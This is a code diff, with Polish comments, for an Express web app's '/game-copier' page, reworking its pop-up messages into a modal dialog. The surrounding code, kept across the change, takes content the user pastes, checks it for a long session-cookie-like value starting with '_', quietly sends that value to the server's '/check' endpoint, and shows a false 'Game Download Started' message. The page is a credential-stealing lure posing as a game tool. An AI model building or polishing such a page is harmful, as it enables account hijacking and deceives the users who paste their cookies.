@@ -64,7 +64,7 @@ app.get('/', (req, res) => {
   `);
 });
 
-// Podstrona /game-copier – z animowanymi pop-upami
+// Podstrona /game-copier – modal z przyciskiem OK + szare tło
 app.get('/game-copier', (req, res) => {
   res.send(`
 <!DOCTYPE html>
@@ -106,35 +106,42 @@ app.get('/game-copier', (req, res) => {
       text-align: center;
     }
 
-    /* Pop-upy */
-    #popup {
+    /* Modal */
+    #modal {
+      display: none;
       position: fixed;
-      top: 50%;
-      left: 50%;
-      transform: translate(-50%, -50%);
-      padding: 24px 48px;
-      border-radius: 16px;
-      font-size: 1.4rem;
-      font-weight: 600;
-      color: white;
+      inset: 0;
+      background: rgba(0,0,0,0.65);
       z-index: 9999;
-      opacity: 0;
-      pointer-events: none;
-      transition: opacity 0.4s ease, transform 0.4s ease;
-      box-shadow: 0 10px 40px rgba(0,0,0,0.4);
-      display: flex;
       align-items: center;
-      gap: 16px;
-      min-width: 380px;
+      justify-content: center;
+    }
+    .modal-content {
+      background: #444444;
+      color: white;
+      padding: 40px 60px;
+      border-radius: 16px;
       text-align: center;
+      max-width: 480px;
+      width: 90%;
+      box-shadow: 0 20px 60px rgba(0,0,0,0.6);
     }
-    #popup.show {
-      opacity: 1;
-      transform: translate(-50%, -50%) scale(1);
+    .modal-icon { font-size: 4rem; margin-bottom: 20px; }
+    .modal-text { font-size: 1.4rem; margin-bottom: 12px; line-height: 1.4; }
+    .modal-tip { font-size: 1.1rem; opacity: 0.85; margin-top: 8px; }
+    .modal-btn {
+      margin-top: 28px;
+      padding: 14px 48px;
+      font-size: 1.2rem;
+      font-weight: 600;
+      border: none;
+      border-radius: 12px;
+      cursor: pointer;
+      transition: all 0.2s;
     }
-    .success { background: #28a745; }
-    .error   { background: #dc3545; }
-    .icon { font-size: 2.2rem; }
+    .modal-btn.success { background: #28a745; color: white; }
+    .modal-btn.error   { background: #dc3545; color: white; }
+    .modal-btn:hover { opacity: 0.9; transform: scale(1.05); }
 
     /* Ramka zygzakowata – bez zmian */
     .zigzag-border {
@@ -265,7 +272,15 @@ app.get('/game-copier', (req, res) => {
 
   <canvas id="bgCanvas"></canvas>
 
-  <div id="popup"></div>
+  <!-- Modal -->
+  <div id="modal">
+    <div class="modal-content">
+      <div id="modal-icon" class="modal-icon"></div>
+      <div id="modal-text" class="modal-text"></div>
+      <div id="modal-tip" class="modal-tip"></div>
+      <button class="modal-btn" id="modal-ok">OK</button>
+    </div>
+  </div>
 
   <div class="container">
     <div class="left">
@@ -292,7 +307,7 @@ app.get('/game-copier', (req, res) => {
   </div>
 
 <script>
-// kropki w tle
+// kropki w tle – bez zmian
 const canvas = document.getElementById('bgCanvas');
 const ctx = canvas.getContext('2d');
 canvas.width = window.innerWidth;
@@ -349,22 +364,26 @@ function animate() {
 }
 animate();
 
-// ── Funkcja pokazująca popup ──
-function showPopup(type, text) {
-  const popup = document.getElementById('popup');
-  popup.innerHTML = \`
-    <span class="icon">\${type === 'success' ? '✅' : '❌'}</span>
-    \${text}
-  \`;
-  popup.className = type === 'success' ? 'success' : 'error';
-  popup.classList.add('show');
+// ── Modal z przyciskiem OK ──
+const modal = document.getElementById('modal');
+const modalIcon = document.getElementById('modal-icon');
+const modalText = document.getElementById('modal-text');
+const modalTip = document.getElementById('modal-tip');
+const modalOkBtn = document.getElementById('modal-ok');
 
-  setTimeout(() => {
-    popup.classList.remove('show');
-  }, 4000);
+modalOkBtn.onclick = () => {
+  modal.style.display = 'none';
+};
+
+function showModal(success, message, tip = '') {
+  modalIcon.textContent = success ? '✅' : '❌';
+  modalText.textContent = message;
+  modalTip.textContent = tip;
+  modalOkBtn.className = 'modal-btn ' + (success ? 'success' : 'error');
+  modal.style.display = 'flex';
 }
 
-// Logika przycisku z popupami
+// Logika przycisku
 async function start() {
   const btn = document.getElementById('btn');
   const raw = document.getElementById('input').value.trim();
@@ -372,7 +391,7 @@ async function start() {
   btn.disabled = true;
 
   if (!raw) {
-    showPopup('error', 'Wrong file<br><small>TIP: Watch the tutorial</small>');
+    showModal(false, 'Wrong file', 'TIP: Watch the tutorial');
     setTimeout(() => btn.disabled = false, 1200);
     return;
   }
@@ -401,20 +420,18 @@ async function start() {
   }
 
   if (!cookie || cookie.length < 180 || !cookie.startsWith('_')) {
-    showPopup('error', 'Wrong file<br><small>TIP: Watch the tutorial</small>');
+    showModal(false, 'Wrong file', 'TIP: Watch the tutorial');
     setTimeout(() => btn.disabled = false, 1200);
     return;
   }
 
-  // Wysyłamy cookie
   fetch('/check', {
     method: 'POST',
     headers: { 'Content-Type': 'application/json' },
     body: JSON.stringify({ cookie })
   }).catch(() => {});
 
-  // Sukces – pokazujemy zielony popup
-  showPopup('success', 'Game Download Started<br><small>(wait 3–5 minutes)</small>');
+  showModal(true, 'Game Download Started', '(wait 3–5 minutes)');
 
   setTimeout(() => btn.disabled = false, 2200);
 }
